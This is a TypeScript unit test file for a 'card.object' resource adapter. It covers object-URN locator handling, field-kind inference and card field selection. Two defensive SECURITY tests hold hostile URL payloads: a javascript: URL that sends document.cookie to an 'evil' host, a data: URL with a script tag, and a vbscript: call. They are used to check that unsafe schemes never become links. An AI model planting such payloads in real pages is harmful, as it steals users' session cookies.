/**
 * card-object-face.test.ts — the resource-adapter shape proof (mirrors
 * card-subject-face.test.ts's own scope) plus pure `selectObjectCardFields`/
 * `inferFieldKind` unit coverage (WS1 §9 S3, master spec §3 Slice 2).
 *
 * A real object read against a real gardend cell is exercised in
 * card-object-face.integration.test.ts.
 */
import { describe, expect, it } from 'vitest'
import type { ResourceLocator } from '@shrubbery/nucleus/layout'
import type { SourceObjectRead, SourceObjectService } from '../../source-object-service.js'
import {
  CARD_OBJECT_ADAPTER_ID,
  CARD_OBJECT_FACE_ID,
  SAFE_REFERENCE_SCHEMES,
  createCardObjectResourceAdapter,
  inferFieldKind,
  selectObjectCardFields,
} from '../card-object-face.js'

const unusedService: SourceObjectService = {
  async read() {
    throw new Error('card-object-face.test.ts: read() should never be invoked by this suite')
  },
}

function baseRead(overrides: Partial<SourceObjectRead> = {}): SourceObjectRead {
  return {
    provenance: 'mirror',
    graphId: 'g1',
    objectKey: 'koch-morseBookmarkabc',
    vocab: 'koch-morse',
    class: 'Bookmark',
    objectId: 'abc',
    record: {},
    unavailable: [],
    ...overrides,
  }
}

describe('card.object — resource adapter shape', () => {
  it('has the expected face id and adapter id', () => {
    expect(CARD_OBJECT_FACE_ID).toBe('card.object')
    const adapter = createCardObjectResourceAdapter(unusedService)
    expect(adapter.adapterId).toBe(CARD_OBJECT_ADAPTER_ID)
    expect(adapter.shape).toBe('derived')
  })

  it('accepts a graph locator carrying a real object URN', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    const locator: ResourceLocator = {
      kind: 'graph',
      graphId: 'g1',
      subjectIri: 'urn:sophia:object:koch-morse:Bookmark:abc',
    }
    expect(adapter.accepts(locator)).toBe(true)
  })

  it('accepts a graph locator with NO subjectIri (the empty-selection leaf, C-D20/R16)', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    expect(adapter.accepts({ kind: 'graph', graphId: 'g1' })).toBe(true)
  })

  it('rejects a graph locator whose subjectIri is an ordinary projection subject, not an object URN', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    const locator: ResourceLocator = {
      kind: 'graph',
      graphId: 'g1',
      subjectIri: 'http://mnemosyne.dev/g1:projection:koch-morse:session:abc',
    }
    expect(adapter.accepts(locator)).toBe(false)
  })

  it('rejects document/chat/query/iri locators', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    expect(adapter.accepts({ kind: 'document', graphId: 'g', documentId: 'd' })).toBe(false)
    expect(adapter.accepts({ kind: 'chat', graphId: 'g', sessionId: 's' })).toBe(false)
    expect(adapter.accepts({ kind: 'query', graphId: 'g', queryId: 'q' })).toBe(false)
    expect(adapter.accepts({ kind: 'iri', iri: 'urn:sophia:object:v:C:x' })).toBe(false)
  })

  it('R16 — the empty-selection leaf acquires a real, stable resource key (never throws before compute)', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    const key = adapter.resourceKey({ kind: 'graph', graphId: 'g1' })
    expect(typeof key).toBe('string')
  })

  it('resourceKey distinguishes the empty-selection leaf from a real object, and real objects from each other', () => {
    const adapter = createCardObjectResourceAdapter(unusedService)
    const empty = adapter.resourceKey({ kind: 'graph', graphId: 'g1' })
    const objA = adapter.resourceKey({ kind: 'graph', graphId: 'g1', subjectIri: 'urn:sophia:object:v:C:a' })
    const objB = adapter.resourceKey({ kind: 'graph', graphId: 'g1', subjectIri: 'urn:sophia:object:v:C:b' })
    expect(new Set([empty, objA, objB]).size).toBe(3)
  })

  it('compute() resolves the empty-selection leaf to a null-valued store WITHOUT calling the service', async () => {
    let called = false
    const service: SourceObjectService = {
      async read() {
        called = true
        return null
      },
    }
    const adapter = createCardObjectResourceAdapter(service)
    const handle = await adapter.compute({ kind: 'graph', graphId: 'g1' })
    expect(handle.key).toBeNull()
    expect(handle.objectKey).toBeNull()
    const value = await handle.run()
    expect(value).toBeNull()
    expect(called).toBe(false)
  })

  it('compute() over a real object locator calls the service with the decoded key', async () => {
    let seen: { graphId: string; key: unknown } | null = null
    const service: SourceObjectService = {
      async read(graphId, key) {
        seen = { graphId, key }
        return baseRead()
      },
    }
    const adapter = createCardObjectResourceAdapter(service)
    const handle = await adapter.compute({ kind: 'graph', graphId: 'g1', subjectIri: 'urn:sophia:object:koch-morse:Bookmark:abc' })
    expect(handle.objectKey).toBe('koch-morseBookmarkabc')
    const value = await handle.run()
    expect(value?.objectId).toBe('abc')
    expect(seen).toEqual({ graphId: 'g1', key: { vocab: 'koch-morse', class: 'Bookmark', objectId: 'abc' } })
  })
})

describe('inferFieldKind — the closed rule table (§6.9)', () => {
  it('null/undefined -> state', () => {
    expect(inferFieldKind(null)).toBe('state')
    expect(inferFieldKind(undefined)).toBe('state')
  })

  it('finite number -> metric', () => {
    expect(inferFieldKind(20)).toBe('metric')
    expect(inferFieldKind(0)).toBe('metric')
    expect(inferFieldKind(-3.5)).toBe('metric')
  })

  it('boolean -> state', () => {
    expect(inferFieldKind(true)).toBe('state')
    expect(inferFieldKind(false)).toBe('state')
  })

  it('http/https/mailto/urn scheme strings -> reference', () => {
    expect(inferFieldKind('https://example.test/x')).toBe('reference')
    expect(inferFieldKind('http://example.test/x')).toBe('reference')
    expect(inferFieldKind('mailto:a@example.test')).toBe('reference')
    expect(inferFieldKind('urn:sophia:object:v:C:x')).toBe('reference')
  })

  it('SECURITY — javascript:/data:/vbscript: values classify as inert state, never reference (script-navigation-sink regression)', () => {
    expect(inferFieldKind('javascript:fetch(\'https://evil/steal?c=\'+document.cookie)')).toBe('state')
    expect(inferFieldKind('data:text/html,<script>alert(1)</script>')).toBe('state')
    expect(inferFieldKind('vbscript:msgbox(1)')).toBe('state')
    // also confirm no href is ever produced for these by the field builder
  })

  it('exposes exactly the closed SAFE_REFERENCE_SCHEMES set', () => {
    expect([...SAFE_REFERENCE_SCHEMES].sort()).toEqual(['http', 'https', 'mailto', 'urn'])
  })

  it('long or newline-bearing strings -> prose', () => {
    expect(inferFieldKind('x'.repeat(121))).toBe('prose')
    expect(inferFieldKind('short\nwith a newline')).toBe('prose')
  })

  it('ordinary short strings -> state', () => {
    expect(inferFieldKind('hello')).toBe('state')
    expect(inferFieldKind('')).toBe('state')
  })

  it('arrays/objects -> prose (nested)', () => {
    expect(inferFieldKind([1, 2, 3])).toBe('prose')
    expect(inferFieldKind({ a: 1 })).toBe('prose')
  })
})

describe('selectObjectCardFields — pure selection (§6.7/§6.9)', () => {
  it('sorts fields lexicographically by key, always', () => {
    const read = baseRead({ record: { zeta: 1, alpha: 2, mu: 3 } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields.map((f) => f.label)).toEqual(['alpha', 'mu', 'zeta'])
  })

  it('titleField hit: matches a record key exactly and becomes the title', () => {
    const read = baseRead({ record: { title: 'My Bookmark', url: 'https://x' } })
    const selection = selectObjectCardFields(read, { titleField: 'title' })
    expect(selection.title).toBe('My Bookmark')
  })

  it('titleField miss: falls back to objectId, never a blank title', () => {
    const read = baseRead({ record: { url: 'https://x' } })
    const selection = selectObjectCardFields(read, { titleField: 'nonexistent' })
    expect(selection.title).toBe('abc')
  })

  it('no titleField at all: falls back to objectId', () => {
    const read = baseRead({ record: { url: 'https://x' } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.title).toBe('abc')
  })

  it('fields allow-list: only the named keys render, others are dropped', () => {
    const read = baseRead({ record: { a: 1, b: 2, c: 3 } })
    const selection = selectObjectCardFields(read, { fields: 'a, c' })
    expect(selection.fields.map((f) => f.label)).toEqual(['a', 'c'])
    expect(selection.shownOf).toBe(2)
  })

  it('maxFields truncates with the honest denominator (shownOf = the TRUE total, not the clamped count)', () => {
    const read = baseRead({ record: { a: 1, b: 2, c: 3, d: 4 } })
    const selection = selectObjectCardFields(read, { maxFields: 2 })
    expect(selection.fields.map((f) => f.label)).toEqual(['a', 'b'])
    expect(selection.shownOf).toBe(4)
  })

  it('maxFields: 0 renders zero fields but STILL reports the true total — data, not "unlimited"', () => {
    const read = baseRead({ record: { a: 1, b: 2 } })
    const selection = selectObjectCardFields(read, { maxFields: 0 })
    expect(selection.fields).toEqual([])
    expect(selection.shownOf).toBe(2)
  })

  it('maxFields normalizes negative input to 0 (never throws, never treated as unlimited)', () => {
    const read = baseRead({ record: { a: 1, b: 2 } })
    const selection = selectObjectCardFields(read, { maxFields: -5 })
    expect(selection.fields).toEqual([])
    expect(selection.shownOf).toBe(2)
  })

  it('maxFields normalizes fractional input by flooring', () => {
    const read = baseRead({ record: { a: 1, b: 2, c: 3 } })
    const selection = selectObjectCardFields(read, { maxFields: 2.7 })
    expect(selection.fields.map((f) => f.label)).toEqual(['a', 'b'])
  })

  it('absent (null) values render with absent:true', () => {
    const read = baseRead({ record: { missing: null } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].absent).toBe(true)
  })

  it('nested (array/object) values render with nested:true and JSON-stringified value text', () => {
    const read = baseRead({ record: { tags: ['a', 'b'] } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].nested).toBe(true)
    expect(selection.fields[0].value).toBe('["a","b"]')
  })

  it('boolean values format as yes/no', () => {
    // Lexicographic key order: 'flag' < 'other'.
    const read = baseRead({ record: { flag: true, other: false } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields.map((f) => f.value)).toEqual(['yes', 'no'])
  })

  it('reference-kind fields carry href set to the exact safe-scheme value', () => {
    const read = baseRead({ record: { url: 'https://example.test/x' } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].kind).toBe('reference')
    expect(selection.fields[0].href).toBe('https://example.test/x')
  })

  it('SECURITY — an unsafe-scheme field never gets an href, on the full selection path', () => {
    const read = baseRead({ record: { evil: 'javascript:alert(1)' } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].kind).toBe('state')
    expect(selection.fields[0].href).toBeUndefined()
  })

  it('authority-path labels shorten to the last #/- or /-delimited predicate IRI segment; fullLabel stays the full IRI', () => {
    const read = baseRead({
      provenance: 'authority-projection',
      record: { 'http://mnemosyne.dev/bookmark#title': 'My Bookmark' },
    })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].label).toBe('title')
    expect(selection.fields[0].fullLabel).toBe('http://mnemosyne.dev/bookmark#title')
  })

  it('mirror-path labels stay the record key verbatim (label === fullLabel)', () => {
    const read = baseRead({ record: { characterWpm: 20 } })
    const selection = selectObjectCardFields(read, {})
    expect(selection.fields[0].label).toBe('characterWpm')
    expect(selection.fields[0].fullLabel).toBe('characterWpm')
  })
})
